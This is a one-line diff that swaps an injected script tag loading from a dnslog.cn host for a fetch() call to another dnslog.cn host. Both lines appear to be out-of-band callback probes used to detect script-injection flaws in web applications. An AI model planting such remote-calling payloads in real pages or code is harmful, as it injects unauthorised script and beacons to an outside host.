@@ -1,1 +1,1 @@
-<script src="https://ekhior.dnslog.cn"></script>
+fetch("https://tla56m.dnslog.cn")
